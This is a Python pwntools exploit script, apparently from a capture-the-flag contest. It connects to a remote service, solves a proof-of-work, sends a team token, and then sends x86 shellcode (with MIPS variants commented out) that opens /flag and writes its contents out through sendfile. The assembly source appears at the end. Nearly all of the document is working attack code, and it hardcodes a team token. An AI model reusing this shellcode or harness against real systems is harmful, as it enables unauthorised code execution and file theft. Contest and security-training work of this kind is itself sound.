#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *
import struct
import hashlib
import os
import time
from Crypto.Util.number import *

team_token = '0676467f246f3fc0e2219c6c99dcdb0e'
def proof_of_work_solve(chal):
    sol = os.urandom(4)
    while not hashlib.sha256(chal + sol).hexdigest().startswith('00000'):
        sol = os.urandom(4)
    return sol.hex()

def do_start() -> remote:
    r = remote('172.20.5.61', 9999)
    r.recvuntil(b"'''\nchal: ")
    PoW = r.recv(16)
    print('PoW found:', PoW.decode())
    r.send(proof_of_work_solve(PoW).encode())
    r.recvuntil(b"'\\n')>")
    r.send(f'{team_token}\n'.encode())
    return r

context.log_level = 'debug'
context.arch = 'x86'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./run_mips.sh"
p = do_start()
# p = process(filename)
# e = ELF(filename)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass
# pwn.shellcraft.cat("/flag")
debugPID()
ru(b'>')
# shellcode = asm('''

# ''')
# shellcode = ""
# shellcode += shellcraft.i386.pushstr('/flag').rstrip()
# shellcode += shellcraft.i386.linux.syscall('SYS_open',"esp", 0).rstrip()
# shellcode += shellcraft.i386.linux.syscall('SYS_read',"eax", 0x80f2000,40).rstrip()
# shellcode += shellcraft.i386.linux.syscall('SYS_write',1, 0x80f2000,40).rstrip()
# shellcode = asm(shellcode)
# shellcode = (shellcode.hex()).encode()
# shellcode = asm(shellcraft.cat('/flag')).hex()
shellcode = b'6a67682f666c6189e331c96a0558cd806a015b89c131d26a405e31c0b0bbcd80'
# shellcode = bytes([60, 9, 47, 102, 53, 41, 108, 97, 175, 169, 255, 248, 60, 25, 152, 255, 55, 57, 255, 255, 3, 32, 72, 39, 175, 169, 255, 252, 39, 189, 255, 248, 3, 160, 32, 32, 52, 5, 255, 255, 0, 160, 40, 42, 52, 2, 15, 165, 1, 1, 1, 12, 36, 25, 255, 254, 3, 32, 32, 39, 175, 162, 255, 252, 143, 165, 255, 252, 52, 6, 255, 255, 0, 192, 48, 42, 60, 7, 127, 255, 52, 231, 255, 255, 52, 2, 16, 111, 1, 1, 1, 12])
# shellcode = bytes.fromhex('6c61093c2f662935f8ffa9af98ff192427482003fcffa9aff8ffbd272020a003ffff05342a28a000a50f02340c010101feff192427202003fcffa2affcffa58fffff06342a30c000ff7f073cffffe7346f1002340c010101')
sl(shellcode)
# sl(shellcode.hex().encode())


irt()
'''
 
push 0x67
push 0x616c662f

mov ebx, esp
xor ecx, ecx

push SYS_open 
pop eax
int 0x80

push 1
pop ebx
mov ecx, eax
xor edx, edx
push 0x40
pop esi

xor eax, eax
mov al, 0xbb
int 0x80'''